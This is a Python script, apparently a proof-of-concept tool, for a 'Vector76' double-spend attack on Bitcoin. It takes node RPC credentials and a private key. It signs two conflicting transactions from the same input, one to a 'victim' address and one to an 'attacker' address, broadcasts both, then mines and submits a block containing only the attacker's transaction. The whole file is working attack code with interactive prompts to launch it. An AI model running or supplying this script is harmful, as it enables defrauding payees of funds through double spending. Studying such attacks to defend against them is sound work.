import sys
import bitcoin
import bitcoin.tests
import bitcoin.transaction

#from bitcoin_tools.core.keys import load_keys
from bitcoin_tools.core.transaction import TX
from bitcoinaddress import Wallet
from bitcoincli import Bitcoin

#attacker_temp_wallet = Wallet()
#sk, pk = load_keys(sys.argv[1])
rpc_host = sys.argv[1]
rpc_port = sys.argv[2]
username = sys.argv[3]
password = sys.argv[4]
key  = sys.argv[5]
address_attacker      = sys.argv[6]#Wallet(format("064x"))
address_victim        = sys.argv[7]#Wallet(format("064x"))
network = sys.argv[8]
print(f"[+] {network} Mode.")
#node_url = "https://bitcoin-mainnet.node.coinapi.io"
#node_api_key = sys.argv[6]
#headers = {
#  'x-coinapi-key': node_api_key,
#  'Content-Type': 'application/json',
#  'accept': 'application/json'
#}
def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return btc_amount / satoshi

#Wallet(format("064x"))
amount_BTC = float(sys.argv[9])
prev_txid  = sys.argv[10]
rpc_node = Bitcoin(username, password, rpc_host, rpc_port)

info = rpc_node.getblockchaininfo()
print(info)
print("--------------------")
amount_satoshi = to_satoshi(amount_BTC)
fee_satoshi = 1500

bitcoin.SelectParams(network)
print("Create T1 rawtx And sign")
tx_victim = TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, address_victim).hex
print(tx_victim)
tx_victim = bitcoin.transaction.sign(tx_victim, key)
print()
print(tx_victim)

print("Create T2 rawtx And sign")
tx_attacker = TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, address_attacker).hex
print(tx_attacker)
tx_attacker = bitcoin.transaction.sign(tx_attacker, key)

print()
print(tx_attacker)
print("[+] READY...")
print(f"Network : {network}")
print(f"Send Amount (Satoshi) : {amount_satoshi - fee_satoshi}")
print(f"Mining Fee  (Satoshi) : {fee_satoshi}")
print(f"Victim   Address      : {address_victim}")
print(f"Attacker Address      : {address_attacker}")
input(" --- Press the enter key to continue the Vector76 attack. --- ")
print("push T1")
result = rpc_node.sendrawtransaction(tx_victim)
print(result)
print("T1 Pushed.")
print("push T2")
result = rpc_node.sendrawtransaction(tx_attacker)
print(result)
print("Mining Vector76 Block...")
miner_Wallet = Wallet()
print(" --- Miner Wallet --- ")
print(address_attacker)
print(" -------------------- ")
vector76_mining_hash = rpc_node.generateblock(f"{address_attacker} [{tx_attacker}]")
print()
print(vector76_mining_hash)
input("--- Send the block after pressing the enter key. --- ")
print()
print(f"submitblock {vector76_mining_hash}")
print()
result = rpc_node.submitblock(vector76_mining_hash)
print(result)
print("Done.")
print(f"Kamijou Touma >> Kill that blockchain transaction!!")
print()